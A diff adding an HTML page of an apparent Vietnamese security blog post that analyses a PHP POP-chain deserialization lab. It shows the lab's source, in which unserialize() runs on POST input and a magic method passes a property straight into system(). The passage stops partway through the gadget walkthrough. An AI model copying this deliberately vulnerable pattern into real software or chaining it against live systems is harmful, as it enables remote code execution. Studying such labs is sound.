@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>POP Chain Analysis &amp; Exploit - Bui Van Y</title><meta name="author" content="Bui Van Y">
+<meta name="description" content="Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE."><meta name="keywords" content='analyst, plugin, arbitrary file upload'>
+  <meta itemprop="name" content="POP Chain Analysis & Exploit">
+  <meta itemprop="description" content="Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE.">
+  <meta itemprop="datePublished" content="2025-11-11T19:00:00+07:00">
+  <meta itemprop="dateModified" content="2025-11-11T19:00:00+07:00">
+  <meta itemprop="wordCount" content="743">
+  <meta itemprop="image" content="http://localhost:1313/posts/2025-11-11-pop-chain-lab1/app.png">
+  <meta itemprop="keywords" content="Analyst,Plugin,Arbitrary File Upload"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/">
+  <meta property="og:site_name" content="Bui Van Y">
+  <meta property="og:title" content="POP Chain Analysis & Exploit">
+  <meta property="og:description" content="Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE.">
+  <meta property="og:locale" content="vi">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-11T19:00:00+07:00">
+    <meta property="article:modified_time" content="2025-11-11T19:00:00+07:00">
+    <meta property="article:tag" content="Analyst">
+    <meta property="article:tag" content="Plugin">
+    <meta property="article:tag" content="Arbitrary File Upload">
+    <meta property="og:image" content="http://localhost:1313/posts/2025-11-11-pop-chain-lab1/app.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/2025-11-11-pop-chain-lab1/app.png">
+  <meta name="twitter:title" content="POP Chain Analysis & Exploit">
+  <meta name="twitter:description" content="Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE.">
+<meta name="application-name" content="Bui Van Y">
+<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/" title="POP Chain Analysis &amp; Exploit - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-11-10-cve-2023-48777/" title="CVE-2023-48777 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/" title="CVE-2025-47637 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/index.md" title="POP Chain Analysis & Exploit - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "POP Chain Analysis \u0026 Exploit",
+    "inLanguage": "vi",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-11-11-pop-chain-lab1\/"
+    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, arbitrary file upload","wordcount":  743 ,
+    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-11-11-pop-chain-lab1\/","datePublished": "2025-11-11T19:00:00+07:00","dateModified": "2025-11-11T19:00:00+07:00","publisher": {
+      "@type": "Organization",
+      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
+        "@type": "Person",
+        "name": "Bui Van Y"
+      },"description": "Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE."
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Đổi chủ đề">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li><li class="menu-item language-switch">
+            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-11-11-pop-chain-lab1/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
+          </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Huỷ
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
+              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+              <select class="language-select" onchange="location = this.value;"><option value="/posts/2025-11-11-pop-chain-lab1/">English</option><option value="/vi/posts/2025-11-11-pop-chain-lab1/" selected disabled>Vietnamese</option></select>
+            </span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
+      <div class="details-summary related-summary">
+        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
+        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
+      <div class="details-content related-content">
+        <ul class="related-list"><li class="related-item">
+              <a href="/vi/posts/2025-11-08-cve-2025-39557/" title="CVE-2025-39557 Analysis &amp; POC">CVE-2025-39557 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-11-07-cve-2025-47577/" title="CVE-2025-47577 Analysis &amp; POC">CVE-2025-47577 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-11-06-cve-2025-10647/" title="CVE-2025-10647 Analysis &amp; POC">CVE-2025-10647 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-11-05-cve-2025-10147/" title="CVE-2025-10147 Analysis &amp; POC">CVE-2025-10147 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-11-04-cve-2025-62065/" title="CVE-2025-62065 Analysis &amp; POC">CVE-2025-62065 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-11-03-cve-2025-2940/" title="CVE-2025-2940 Analysis &amp; POC">CVE-2025-2940 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-11-02-cve-2025-1043/" title="CVE-2025-1043 Analysis &amp; POC">CVE-2025-1043 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-11-01-cve-2025-52713/" title="CVE-2025-52713 Analysis &amp; POC">CVE-2025-52713 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-10-31-cve-2025-60161/" title="CVE-2025-60161 Analysis &amp; POC">CVE-2025-60161 Analysis &amp; POC</a></li><li class="related-item">
+              <a href="/vi/posts/2025-10-30-cve-2025-11128/" title="CVE-2025-11128 Analysis &amp; POC">CVE-2025-11128 Analysis &amp; POC</a></li></ul>
+      </div>
+    </div></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>POP Chain Analysis &amp; Exploit</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analyst/" class="post-category" title="Danh mục - CVE Analyst"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analyst</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-11-11 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-11">2025-11-11</time></span>&nbsp;<span title="743 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 800 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 phút</span>&nbsp;</div>
+    </div><div class="featured-image"><img src='/posts/2025-11-11-pop-chain-lab1/app.png' alt="/posts/2025-11-11-pop-chain-lab1/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Nội dung</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#analysis">Analysis</a>
+      <ul>
+        <li><a href="#tổng-quan-mã-nguồn">Tổng quan mã nguồn</a></li>
+        <li><a href="#luồng-thực-thi-dẫn-đến-shell">Luồng thực thi dẫn đến shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploit">Exploit</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 class="heading-element" id="intro"><span>Intro</span>
+  <a href="#intro" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Trong quá trình nghiên cứu <strong>Insecure Deserialization</strong>, mình nhận được một lab liên quan đến <strong>POP Chain</strong> (Property-Oriented Programming Chain). Đây là một dạng tấn công thú vị: thay vì khai thác hàm hay lệnh trực tiếp, kẻ tấn công kết hợp các <em>gadget</em> (các phương thức magic của class) để đạt được mục tiêu — ví dụ thực thi lệnh hệ thống (RCE).</p>
+<p>Bài viết này mô tả quá trình mình phân tích và khai thác lab: từ xem qua mã nguồn, nhận diện các gadget hữu dụng, tới cách xây payload để kích hoạt chuỗi gọi (POP chain). Mục tiêu là giúp bạn hiểu được phương pháp tư duy khi xử lý lab kiểu này.</p>
+<p>Lab mình thực hiện:
+<a href="https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php</a></p>
+<h2 class="heading-element" id="analysis"><span>Analysis</span>
+  <a href="#analysis" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="tổng-quan-mã-nguồn"><span>Tổng quan mã nguồn</span>
+  <a href="#t%e1%bb%95ng-quan-m%c3%a3-ngu%e1%bb%93n" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight" title="lab.php" data-open="true"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$memo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memo</span><span class="o">=</span><span class="k">new</span> <span class="nx">Note</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">name</span><span class="o">.</span><span class="s2">&#34;say hello&#34;</span><span class="p">,</span> <span class="s1">&#39;test_whale&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Note</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$whale</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="nv">$whale</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">whale</span><span class="o">=</span><span class="nv">$whale</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">record</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">whale</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="s1">&#39;Record for &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">whale</span><span class="o">.</span><span class="s1">&#39; is : &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">record</span><span class="p">(</span><span class="nv">$whale</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//check whether it&#39;s an attribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$test</span><span class="o">=</span><span class="nv">$whale</span><span class="o">-&gt;</span><span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$test</span><span class="o">!=</span><span class="k">NULL</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span><span class="p">(</span><span class="s2">&#34;It&#39;s probably an attribute&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Whale</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$note</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">take_note</span><span class="p">(</span><span class="nv">$note</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">note</span><span class="o">=</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y/m/d H:i:s&#34;</span><span class="p">)</span><span class="o">.</span><span class="nv">$note</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$attribute</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">system</span><span class="p">(</span><span class="s1">&#39;echo &#34;&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s1">&#39;&#34; &gt;&gt; log.txt&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$attribute</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>File chính có ba class quan trọng: <code>User</code>, <code>Note</code>, <code>Whale</code>. Cuối file có dòng unserialize đầu vào nếu <code>$_POST['pop']</code> được gửi:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Những điểm đáng chú ý:</p>
+<ul>
+<li>Dòng <strong>8</strong>: <code>User::__wakeup()</code> tạo một <code>Note</code> và gán vào <code>$this-&gt;memo</code>.</li>
+<li>Dòng <strong>23</strong>: <code>Note::__toString()</code> gọi <code>record()</code> rồi trả về một chuỗi.</li>
+<li>Dòng <strong>28</strong>: <code>Note::record()</code> truy xuất <code>$whale-&gt;$content</code>.</li>
+<li>Dòng <strong>44</strong>: <code>Whale::__get()</code> gọi <code>system('echo &quot;'.$this-&gt;name.'&quot; &gt;&gt; log.txt');</code>.</li>
+<li>Dòng <strong>52</strong>: vị trí gọi <code>unserialize(...)</code> — điểm tấn công.</li>
+</ul>
+<h3 class="heading-element" id="luồng-thực-thi-dẫn-đến-shell"><span>Luồng thực thi dẫn đến shell</span>
+  <a href="#lu%e1%bb%93ng-th%e1%bb%b1c-thi-d%e1%ba%abn-%c4%91%e1%ba%bfn-shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ol>
+<li>
+<p><strong>Unserialize một <code>User</code></strong>: Khi unserialize một object <code>User</code>, magic method <code>__wakeup()</code> sẽ chạy. Ở đây <code>__wakeup()</code> khởi tạo một <code>Note</code> mới bằng cách lấy <code>$this-&gt;name . &quot;say hello&quot;</code> làm content và <code>'test_whale'</code> làm whale:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
